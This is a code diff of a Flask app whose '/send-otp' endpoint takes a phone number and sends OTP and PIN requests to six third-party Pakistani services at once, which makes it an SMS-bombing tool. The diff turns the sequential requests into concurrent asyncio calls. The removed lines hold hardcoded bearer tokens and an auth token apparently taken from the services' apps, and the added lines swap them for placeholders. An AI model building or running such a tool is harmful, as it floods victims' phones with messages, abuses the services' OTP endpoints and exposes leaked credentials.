@@ -1,7 +1,7 @@
 from flask import Flask, request, jsonify, render_template
 from flask_cors import CORS
-import requests
-import time
+import asyncio
+import aiohttp
 import logging
 
 app = Flask(__name__)
@@ -11,12 +11,35 @@ CORS(app)
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
+# Function to send asynchronous POST requests
+async def send_post_request(url, headers=None, data=None, json=None):
+    async with aiohttp.ClientSession() as session:
+        try:
+            async with session.post(url, headers=headers, data=data, json=json) as response:
+                response_data = await response.json()
+                logger.info(f"Request to {url} succeeded with status {response.status}")
+                return {"status": response.status, "response": response_data}
+        except Exception as e:
+            logger.error(f"Request to {url} failed: {e}")
+            return {"error": str(e)}
+
+# Function to handle each API independently
+async def handle_api_request(api_name, request_function, delay):
+    await asyncio.sleep(delay)  # Delay to avoid hitting rate limits
+    logger.info(f"Starting {api_name} after {delay} seconds delay")
+    result = await request_function()
+    if "error" in result:
+        logger.error(f"{api_name} failed: {result['error']}")
+    else:
+        logger.info(f"{api_name} succeeded: {result['response']}")
+    return {api_name: result}
+
 @app.route('/')
 def index():
     return render_template('index.html')
 
 @app.route('/send-otp', methods=['POST'])
-def send_otp():
+async def send_otp():
     data = request.json
     phone_number = data.get('phone_number')
     if not phone_number:
@@ -24,68 +47,27 @@ def send_otp():
 
     logger.info(f"Received request to send OTP to {phone_number}")
 
-    responses = []
+    tasks = []
 
-    def execute_api_request(api_name, function, delay):
-        try:
-            time.sleep(delay)
-            response = function()
-            if response.status_code == 502:
-                logger.warning(f"{api_name} returned a 502 Bad Gateway error, skipping...")
-                responses.append({
-                    "api_name": api_name,
-                    "status_code": 502,
-                    "error": "502 Bad Gateway"
-                })
-                return  # Skip further processing for this API
-            elif response.status_code == 200:
-                logger.info(f"{api_name} response: {response.status_code} - {response.text}")
-                responses.append({
-                    "api_name": api_name,
-                    "status_code": response.status_code,
-                    "response": response.json() if response.content else {"error": "Empty response"}
-                })
-            else:
-                logger.warning(f"{api_name} failed with status code {response.status_code}: {response.text}")
-                responses.append({
-                    "api_name": api_name,
-                    "status_code": response.status_code,
-                    "error": response.text
-                })
-        except Exception as e:
-            logger.error(f"An error occurred with {api_name}: {str(e)}")
-            responses.append({
-                "api_name": api_name,
-                "error": str(e)
-            })
-
-    # First API request
-    def api_1():
-        url1 = "https://web.udhaar.pk/udhaar/dukaan/create/sendotp/"
-        headers1 = {
+    # Define the request functions for each API
+    tasks.append(handle_api_request("API 1", lambda: send_post_request(
+        url="https://web.udhaar.pk/udhaar/dukaan/create/sendotp/",
+        headers={
             "Host": "web.udhaar.pk",
-            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:96.0) Gecko/20100101 Firefox/96.0",
+            "User-Agent": "Mozilla/5.0",
             "Accept": "application/json, text/plain, */*",
-            "Accept-Language": "en-US,en;q=0.5",
-            "Accept-Encoding": "gzip, deflate, br",
-            "Origin": "https://web.udhaar.pk",
-            "Referer": "https://web.udhaar.pk/SignUp",
-            "Sec-Fetch-Dest": "empty",
-            "Sec-Fetch-Mode": "cors",
-            "Sec-Fetch-Site": "same-origin",
             "Content-Type": "application/json; charset=UTF-8"
-        }
-        payload1 = {
+        },
+        json={
             "phone_number": phone_number,
             "referer": None,
             "version": "multi-business"
         }
-        return requests.post(url1, headers=headers1, json=payload1)
+    ), delay=4))
 
-    # Second API request
-    def api_2():
-        url2 = "https://staging.cricwick.net:13002/api/send_pin"
-        params2 = {
+    tasks.append(handle_api_request("API 2", lambda: send_post_request(
+        url="https://staging.cricwick.net:13002/api/send_pin",
+        data={
             "telco": "easypaisa",
             "phone": phone_number,
             "sub_type": "",
@@ -94,18 +76,16 @@ def send_otp():
             "is_bundle": 1,
             "bundle_id": 13
         }
-        return requests.get(url2, params=params2)
+    ), delay=1))
 
-    # Third API request
-    def api_3():
-        url3 = "https://jazztv.pk/alpha/api_gateway/index.php/users-dbss/send-otp-wc"
-        headers3 = {
-            "authorization": "bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC9qYXp6dHYucGtcL2FscGhhXC9hcGlfZ2F0ZXdheVwvYXV0aFwvbG9naW4iLCJpYXQiOjE3MjA3NzcwMjEsImV4cCI6MTcyMTM3NzAyMSwibmJmIjoxNzIwNzc3MDIxLCJqdGkiOiJvUlpwRnFlSkllZ0NRWU1hIiwic3ViIjo2LCJwcnYiOiI4N2UwYWYxZWY5ZmQxNTgxMmZkZWM5NzE1M2ExNGUwYjA0NzU0NmFhIn0.0EyymdeXeSGI2bI38IBr-YMvH_Stnm1v2ISQ0GVJchs",
+    tasks.append(handle_api_request("API 3", lambda: send_post_request(
+        url="https://jazztv.pk/alpha/api_gateway/index.php/users-dbss/send-otp-wc",
+        headers={
+            "authorization": "bearer YOUR_BEARER_TOKEN",
             "content-type": "application/x-www-form-urlencoded",
-            "accept-encoding": "gzip",
             "user-agent": "okhttp/3.10.0"
-        }
-        data1 = {
+        },
+        data={
             "other_telco": "telenor",
             "device_id": "3acc1d874d4538ef",
             "user_id": "58832432",
@@ -114,25 +94,23 @@ def send_otp():
             "mobile": phone_number,
             "type": "prepaid"
         }
-        return requests.post(url3, headers=headers3, data=data1)
+    ), delay=3))
 
-    # Fourth API request
-    def api_4():
-        url4 = "https://portallapp.com/api/v1/auth/generate-otp"
-        payload4 = {
+    tasks.append(handle_api_request("API 4", lambda: send_post_request(
+        url="https://portallapp.com/api/v1/auth/generate-otp",
+        json={
             "mobile_no": phone_number[-10:]  # Extract the last 10 digits for mobile_no
         }
-        return requests.post(url4, json=payload4)
+    ), delay=1))
 
-    # Fifth API request
-    def api_5():
-        url5 = "https://jazztv.pk/alpha/api_gateway/index.php/v2/users-dbss/sign-up-wc"
-        headers5 = {
-            "Authorization": "bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC9qYXp6dHYucGtcL2FscGhhXC9hcGlfZ2F0ZXdheVwvaW5kZXgucGhwXC9hdXRoXC9sb2dpbiIsImlhdCI6MTcyNDY4NDA4NSwiZXhwIjoxNzI1Mjg0MDg1LCJuYmYiOjE3MjQ2ODQwODUsImp0aSI6IjFxVDl0U1NqQ3FZUDNOeVIiLCJzdWIiOjYsInBydiI6Ijg3ZTBhZjFlZjlmZDE1ODEyZmRlYzk3MTUzYTE0ZTBiMDQ3NTQ2YWEifQ.WQJtyziTZJ8CB89H2tm2V16CRu_VLrC1iBkCUqnQwqk",
+    tasks.append(handle_api_request("API 5", lambda: send_post_request(
+        url="https://jazztv.pk/alpha/api_gateway/index.php/v2/users-dbss/sign-up-wc",
+        headers={
+            "Authorization": "bearer YOUR_BEARER_TOKEN",
             "Content-Type": "application/x-www-form-urlencoded",
             "User-Agent": "okhttp/3.10.0"
-        }
-        data5 = {
+        },
+        data={
             "device": "android",
             "utm_medium": "",
             "from_screen": "packages1",
@@ -150,32 +128,26 @@ def send_otp():
             "utm_source_fb": "",
             "utm_campaign": ""
         }
-        return requests.post(url5, headers=headers5, data=data5)
+    ), delay=1))
 
-    # Sixth API request
-    def api_6():
-        url6 = "https://baseapi.oraan.com/api/users/send-otp"
-        auth_token = "0147C481BF6D516739336659C7CE1FDA528FEFE691DF130C0D4731EFCA06B14DE10B3166BCF76E8BC07AA08C0A344E2924DBC282387949D72B7DB773DD7BF4A7"
-        headers6 = {
+    tasks.append(handle_api_request("API 6", lambda: send_post_request(
+        url="https://baseapi.oraan.com/api/users/send-otp",
+        headers={
             "user-agent": "Dart/2.19 (dart:io)",
-            "auth_token": auth_token,
+            "auth_token": "YOUR_AUTH_TOKEN",
             "accept-encoding": "gzip",
-        }
-        data6 = {
+        },
+        data={
             "phone": f"+92{phone_number[-10:]}",  # Convert to +92 format for this API
             "whatsapp": "false"
         }
-        return requests.post(url6, headers=headers6, data=data6)
+    ), delay=1))
 
-    # Execute all API requests independently
-    execute_api_request("API 1", api_1, 4)
-    execute_api_request("API 2", api_2, 1)
-    execute_api_request("API 3", api_3, 3)
-    execute_api_request("API 4", api_4, 1)
-    execute_api_request("API 5", api_5, 1)
-    execute_api_request("API 6", api_6, 1)
+    # Run all tasks concurrently
+    results = await asyncio.gather(*tasks)
 
-    return jsonify({"success": True, "message": "OTP requests processed", "responses": responses}), 200
+    # Return the combined results
+    return jsonify({"success": True, "responses": results}), 200
 
 if __name__ == '__main__':
     app.run(debug=True)
